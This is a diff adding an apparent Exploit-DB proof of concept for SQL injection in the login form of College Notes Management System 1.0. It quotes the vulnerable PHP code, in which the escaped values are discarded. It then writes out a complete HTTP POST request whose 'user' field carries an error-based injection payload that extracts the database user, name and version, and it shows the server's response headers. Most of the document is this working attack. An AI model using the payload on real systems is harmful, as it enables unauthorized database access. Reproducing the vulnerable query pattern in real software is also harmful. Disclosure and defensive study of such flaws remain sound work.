@@ -1,0 +1,55 @@
+# Exploit Title: College Notes Management System 1.0 - 'user' SQL Injection
+# Dork: N/A
+# Date: 2018-10-15
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://anirbandutta.ml/
+# Software Link: https://sourceforge.net/projects/college-notes-management/
+# Software Link: https://github.com/anirbandutta9/College-Notes-Gallery
+# git clone https://git.code.sf.net/p/college-notes-management/code college-notes-management-code
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://192.168.1.27/[PATH]/login.php
+# login.php
+# ......
+# if (isset($_POST['login'])) {
+#   $username  = $_POST['user'];
+#   $password = $_POST['pass'];
+#   mysqli_real_escape_string($conn, $username);
+#   mysqli_real_escape_string($conn, $password);
+# $query = "SELECT * FROM users WHERE username = '$username'";
+# $result = mysqli_query($conn , $query) or die (mysqli_error($conn));
+# if (mysqli_num_rows($result) > 0) {
+#   while ($row = mysqli_fetch_array($result)) {
+#     $id = $row['id'];
+#     $user = $row['username'];
+#     $pass = $row['password'];
+#     $name = $row['name'];
+# ......
+
+POST /[PATH]/login.php HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 240
+user='%20aND%20(SeleCT%207804%20FroM(SeleCT%20COUNT(*),ConCaT((SeleCT%20(ELT(7804=7804,1))),ConCaT_WS(0x203a20,usER(),DaTaBaSE(),VERSIon()),FloOR(RaND(0)*2))x%20FroM%20INFORMaTIon_SCHEMa.PLugINS%20GroUP%20BY%20x)a)--%20Efe&pass=&login=login
+HTTP/1.1 200 OK
+Date: Sat, 15 Oct 2018 00:51:03 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=b6mgibtddijtde10ti6umf9kc5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1843
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
